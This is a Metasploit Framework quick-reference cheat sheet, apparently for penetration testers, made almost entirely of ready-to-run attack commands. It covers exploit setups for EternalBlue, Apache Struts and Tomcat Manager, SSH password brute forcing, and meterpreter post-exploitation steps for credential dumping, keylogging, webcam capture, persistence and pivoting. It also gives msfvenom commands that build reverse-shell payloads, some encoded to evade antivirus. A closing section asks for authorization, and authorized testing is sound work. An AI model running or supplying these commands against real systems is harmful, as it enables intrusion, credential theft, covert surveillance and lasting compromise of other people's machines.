# Metasploit Framework Quick Reference

Common commands and workflows for Metasploit Framework.

---

## Starting Metasploit

```bash
# Start msfconsole
msfconsole

# Start with specific resource script
msfconsole -r script.rc

# Start database
msfdb init
msfdb start
```

---

## Search & Selection

```bash
# Search for exploits
search type:exploit platform:windows smb
search cve:2017 type:exploit
search eternalblue

# Search for payloads
search type:payload platform:windows meterpreter

# Search for auxiliary modules
search type:auxiliary rdp

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/portscan/tcp
```

---

## Module Information

```bash
# Show module info
info

# Show module options
show options
show advanced
show evasion

# Show available targets
show targets

# Show available payloads
show payloads
```

---

## Setting Options

```bash
# Set required options
set RHOSTS 192.168.1.100
set RHOST 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# Set payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set target
set TARGET 0

# Unset option
unset RHOSTS

# Set global options
setg LHOST 192.168.1.50
setg RHOSTS 192.168.1.0/24
```

---

## Running Modules

```bash
# Run exploit
exploit
run

# Run in background
exploit -j
run -j

# Run with check first
check
exploit

# Run auxiliary module
run
```

---

## Common Exploits

### Windows SMB (MS17-010 - EternalBlue)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Apache Struts (CVE-2017-5638)
```bash
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS target.com
set TARGETURI /struts2-showcase
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

### Tomcat Manager
```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 192.168.1.100
set RPORT 8080
set HttpUsername admin
set HttpPassword admin
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 192.168.1.50
exploit
```

---

## Auxiliary Modules

### Port Scanning
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 80,443,8080
run
```

### SMB Enumeration
```bash
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.100
run
```

### HTTP Directory Scanner
```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
run
```

### SSH Login
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE passwords.txt
run
```

---

## Meterpreter Commands

### System Information
```bash
# Basic info
sysinfo
getuid
getpid

# Process list
ps

# Network info
ipconfig
ifconfig
route
netstat
```

### File System
```bash
# Navigate
pwd
cd C:\\Users
ls
dir

# Download/Upload
download C:\\sensitive.txt /tmp/
upload /tmp/tool.exe C:\\Users\\Public\\

# Search files
search -f *.txt
search -d C:\\Users -f passwords.txt
```

### Process Management
```bash
# Migrate to process
ps
migrate <PID>

# Kill process
kill <PID>

# Execute command
execute -f cmd.exe -i
```

### Privilege Escalation
```bash
# Get system
getsystem

# Check privileges
getprivs

# UAC bypass
use exploit/windows/local/bypassuac
run

# Enumerate local exploits
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Persistence
```bash
# Create persistence
run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Registry persistence
use exploit/windows/local/persistence_service
set SESSION 1
run
```

### Credential Harvesting
```bash
# Hashdump
hashdump

# Mimikatz
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets

# Password hashes
use post/windows/gather/credentials/credential_collector
set SESSION 1
run
```

### Pivoting
```bash
# Add route
route add 10.10.10.0 255.255.255.0 1

# Port forwarding
portfwd add -l 3389 -p 3389 -r 10.10.10.50
portfwd list
portfwd delete -l 3389

# Socks proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

### Screenshots & Keylogging
```bash
# Screenshot
screenshot

# Start keylogger
keyscan_start
keyscan_dump
keyscan_stop

# Webcam
webcam_list
webcam_snap
webcam_stream
```

---

## Session Management

```bash
# List sessions
sessions -l

# Interact with session
sessions -i 1

# Background session
background
Ctrl+Z

# Kill session
sessions -k 1

# Kill all sessions
sessions -K

# Upgrade shell to meterpreter
sessions -u 1
```

---

## Database

```bash
# Workspace management
workspace
workspace -a project1
workspace -d project1
workspace project1

# Import scan results
db_import nmap_scan.xml

# Database queries
hosts
services
vulns
loot
creds

# Search database
hosts -S windows
services -p 445
```

---

## Payload Generation

### Windows Payloads
```bash
# Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# Reverse HTTPS
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell.exe

# Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind.exe
```

### Linux Payloads
```bash
# ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# Shell script
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.sh
```

### Web Payloads
```bash
# PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.jsp

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o shell.asp
```

### Encoded Payloads
```bash
# With encoder
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# List encoders
msfvenom -l encoders

# List formats
msfvenom -l formats
```

---

## Handler Setup

```bash
# Set up listener
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j

# Multiple handlers
handler -p windows/meterpreter/reverse_tcp -H 192.168.1.50 -P 4444
```

---

## Resource Scripts

Create `.rc` files to automate tasks:

```ruby
# example.rc
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

Run with:
```bash
msfconsole -r example.rc
resource example.rc
```

---

## Post-Exploitation Modules

### Information Gathering
```bash
use post/windows/gather/enum_applications
use post/windows/gather/enum_logged_on_users
use post/windows/gather/checkvm
use post/linux/gather/enum_system
```

### Privilege Escalation
```bash
use post/multi/recon/local_exploit_suggester
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

### Lateral Movement
```bash
use exploit/windows/smb/psexec
use exploit/windows/local/current_user_psexec
```

---

## Tips & Tricks

```bash
# Quick search
grep meterpreter search windows

# Save output
spool /tmp/msf_output.txt
<commands>
spool off

# History
history

# Help
help
help <command>

# Exit
exit
quit
```

---

## Common Issues

**Handler not catching shell:**
- Check LHOST (should be attacker IP)
- Verify firewall allows incoming connections
- Ensure payload matches handler settings

**Session dies immediately:**
- Try migrating to stable process quickly
- Use staged payload instead of stageless
- Check antivirus/EDR

**Exploit fails:**
- Run `check` command first
- Verify target architecture (x86 vs x64)
- Try different payload
- Check module options

---

## Security Notes

- Always verify authorization before using Metasploit
- Use only in authorized penetration testing
- Clean up persistence mechanisms after testing
- Document all actions for reporting
- Handle credentials securely
